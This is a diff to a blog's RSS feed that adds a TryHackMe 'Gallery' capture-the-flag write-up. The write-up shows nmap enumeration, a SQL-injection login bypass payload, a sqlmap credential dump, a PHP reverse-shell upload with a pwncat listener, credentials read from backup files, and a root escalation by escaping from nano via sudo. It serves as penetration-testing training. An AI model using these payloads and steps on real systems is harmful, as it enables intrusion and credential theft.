@@ -6,7 +6,209 @@
     <description>Recent posts from on Mathew Alabi | •Kurrupt68</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Sun, 09 Aug 2020 23:38:49 +0530</lastBuildDate><atom:link href="https://Kurrupt68.github.io/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Sat, 19 Feb 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://Kurrupt68.github.io/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>TryHackMe - Gallery</title>
+      <link>https://Kurrupt68.github.io/post/thm-gallery-writeup/</link>
+      <pubDate>Sat, 19 Feb 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://Kurrupt68.github.io/post/thm-gallery-writeup/</guid>
+      <description>&lt;p&gt;&lt;img src=&#34;https://Kurrupt68.github.io/gallery.png&#34; alt=&#34;Header image&#34;&gt;
+Try to exploit our image gallery system&lt;/p&gt;
+&lt;p&gt;Alright, let&amp;rsquo;s get to it.&lt;/p&gt;
+&lt;h2 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h2&gt;
+&lt;p&gt;Started with an nmap scan to help identify open ports and services.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;⚡ ~/tryhackme/Gallery ❯  nmap -sS -sV -A 10.10.67.206
+Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-20 16:55 MST
+Nmap scan report for 10.10.67.206
+Host is up (0.18s latency).
+Not shown: 998 closed ports
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+8080/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+| http-open-proxy: Potentially OPEN proxy.
+|_Methods supported:CONNECTION
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Simple Image Gallery System
+
+Network Distance: 2 hops
+
+TRACEROUTE (using port 199/tcp)
+HOP RTT       ADDRESS
+1   190.15 ms 10.9.0.1
+2   190.12 ms 10.10.67.206
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 34.61 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;hmm,two ports seem to be open and running HTTP services heading over to port 80 shows the Apache2 Ubuntu Default Page, I checked port 8080 that revealed some sort of a Content Management System login page at /gallery/login.php.&lt;/p&gt;
+&lt;h2 id=&#34;exploitation&#34;&gt;Exploitation&lt;/h2&gt;
+&lt;p&gt;Just one google search and I was able to identify the CMS &amp;ldquo;Simple Image Gallery System&amp;rdquo; a little bit more google-fu and I got results that showed the CMS is vulnerable to RCE and  SQL injection in the username field that allows an attacker to bypass the login, possible with this payload.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;
+&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;
+&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;
+&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;admin&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; or &amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;=&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;#
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;on the dashboard there are 4 albums and 6 images, clicking on the Album page and then clicking on any album the in link I observed the id URL, at this point I fired up burp to capture the request and then saved it as gallery.req,then I ran sqlmap with the following commands to retrive the admin hash.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;⚡  ~/tryhackme &amp;gt; sqlmap -r gallery.req -D gallery_db -T users -C username,password --dump --thread 10
+ [18:04:18] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 18.04 (bionic)
+web application technology: Apache 2.4.29
+back-end DBMS: MySQL &amp;gt;= 5.0.12 (MariaDB fork)
+[18:04:18] [INFO] fetching entries of column(s) &#39;password,username&#39; for table &#39;users&#39; in database &#39;gallery_db&#39;
+[18:04:18] [INFO] fetching number of column(s) &#39;password,username&#39; entries for table &#39;users&#39; in database &#39;gallery_db&#39;
+[18:04:18] [INFO] resumed: 1
+[18:04:18] [INFO] retrieving the length of query output
+[18:04:18] [INFO] resumed: 32
+[18:04:29] [INFO] retrieved: a22_REDACTED_NO_SPOILERS_OFC_XD       
+[18:04:29] [INFO] retrieving the length of query output
+[18:04:29] [INFO] retrieved: 5
+[18:04:34] [INFO] retrieved: admin           
+[18:04:34] [INFO] recognized possible password hashes in column &#39;password&#39;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Now to pwn user ; going back to the CMS on port 8080, I could upload images and luckily the CMS is vulnerable to unrestricted file upload. I tried to upload a php-reverse-shell(from pentest monkey). starting my pwncat listner (keep reading you would get to know why I didn&amp;rsquo;t use netcat) on the correct port as specified in my php-reverse-shell-file.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt; ⚡ root@kali  ~   pwncat-cs -lp 1232
+[18:32:06] Welcome to pwncat 🐈!                                 __main__.py:164
+bound to 0.0.0.0:1232 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;To start our reverse shell you can simply click on the php file from the album page and that&amp;rsquo;s it we&amp;rsquo;ve got a shell as www-data,looking at the passwd file I noticed that there&amp;rsquo;s a user mike (also from the tryhackme hint).&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;(remote) www-data@gallery:/home$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+.
+.
+.
+.
+.
+.
+.
+.
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+mike:x:1001:1001:mike:/home/mike:/bin/bash
+mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Heading over to mike&amp;rsquo;s home folder and listing the files.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;(remote) www-data@gallery:/home/mike$ ls -lah 
+total 44K
+drwxr-xr-x 6 mike mike 4.0K Aug 25 09:15 .
+drwxr-xr-x 4 root root 4.0K May 20  2021 ..
+-rw------- 1 mike mike  135 May 24  2021 .bash_history
+-rw-r--r-- 1 mike mike  220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 mike mike 3.7K May 20  2021 .bashrc
+drwx------ 3 mike mike 4.0K May 20  2021 .gnupg
+drwxrwxr-x 3 mike mike 4.0K Aug 25 09:15 .local
+-rw-r--r-- 1 mike mike  807 Apr  4  2018 .profile
+drwx------ 2 mike mike 4.0K May 24  2021 documents
+drwx------ 2 mike mike 4.0K May 24  2021 images
+-rwx------ 1 mike mike   32 May 14  2021 user.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Alright &lt;strong&gt;user.txt&lt;/strong&gt;, but only mike can read or make changes to this file,next thing I did was to use the find command to locate all files that belonged to mike.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;(remote) www-data@gallery:/tmp$ find / 2&amp;gt;/dev/null |grep mike
+/home/mike
+/home/mike/user.txt
+.
+.
+.
+/var/backups/mike_home_backup
+.
+.
+/var/backups/mike_home_backup/documents
+/var/backups/mike_home_backup/documents/accounts.txt
+/var/backups/mike_home_backup/.profile
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Alright,there&amp;rsquo;s a back up of mike&amp;rsquo;s home directory and there&amp;rsquo;s a file named accounts.txt that contains credentials to some of mike&amp;rsquo;s accounts&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;(remote) www-data@gallery:/var/backups/mike_home_backup/documents$ cat accounts.txt 
+Spotify : mike@gmail.com:mycat666
+Netflix : mike@gmail.com:123456789pass
+TryHackme: mike:darkhacker123
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Sadly these didn&amp;rsquo;t get me into mike&amp;rsquo;s account, so i cheecked the .bashhistory in mike&amp;rsquo;s backup folder,&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;(remote) www-data@gallery:/var/backups/mike_home_backup$ cat .bash_history 
+cd ~
+ls
+ping 1.1.1.1
+cat /home/mike/user.txt
+cd /var/www/
+ls
+cd html
+ls -al
+cat index.html
+sudo -lb3stpassw0rdbr0xx
+clear
+sudo -l
+exit
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;and there it&amp;rsquo;s mike&amp;rsquo;s password, i used the su command to get into mike&amp;rsquo;s account, at this point I had access to /home/mike/user.txt, submitted the user flag.&lt;/p&gt;
+&lt;h2 id=&#34;becoming-root&#34;&gt;Becoming root&lt;/h2&gt;
+&lt;p&gt;With the help of linpeas I discoverd mike could run a bash script as root.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;mike@gallery:/var/backups/mike_home_backup$ sudo -l 
+Matching Defaults entries for mike on gallery:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User mike may run the following commands on gallery:
+    (root) NOPASSWD: /bin/bash /opt/rootkit.sh
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;reading the content of the script, mike can carry out a set of operations, the one that stuck out to me was the nano command.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;
+&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;
+&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 1
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 2
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 3
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 4
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 5
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 6
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 7
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 8
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 9
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;10
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;11
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;12
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;13
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;14
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;15
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;16
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;17
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;
+&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/bin/bash
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+read -e -p &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Would you like to versioncheck, update, list or read the report ? &amp;#34;&lt;/span&gt; ans;
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# Execute your choice&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; $ans in
+    versioncheck&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+        /usr/bin/rkhunter --versioncheck ;;
+    update&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+        /usr/bin/rkhunter --update;;
+    list&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+        /usr/bin/rkhunter --list;;
+    read&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+        /bin/nano /root/report.txt;;
+    *&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+        exit;;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;esac&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;heading over to gtfobins , searching for the nano binary we can break out of a restricted environment and spawn a shell right from nano by running this commands in nano here&amp;rsquo;s where using pwncat becomes important, I spent a significant amount of time trying to make this work with a netcat session which didnt work out and i ended up breaking my shell (quite frustrating!).&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;
+&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;
+&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;
+&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;^R^X &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;pressing CTRL+R &lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt; CTRL+X_&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+reset; sh 1&amp;gt;&amp;amp;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; 2&amp;gt;&amp;amp;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;And finally Root!.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;root@gallery:/var/backups/mike_home_backup# id
+uid=0(root) gid=0(root) groups=0(root)
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;
+&lt;p&gt;Gallery is a decent easy box that helps get the basics in, I tried a ton of things trying to solve this box , a RCE script,the numerous sudo exploits.
+Note to self: Remember to check for backup files and exploiting capabilities.&lt;/p&gt;</description>
+    </item>
+    
     <item>
       <title>First post</title>
       <link>https://Kurrupt68.github.io/post/first-post/</link>
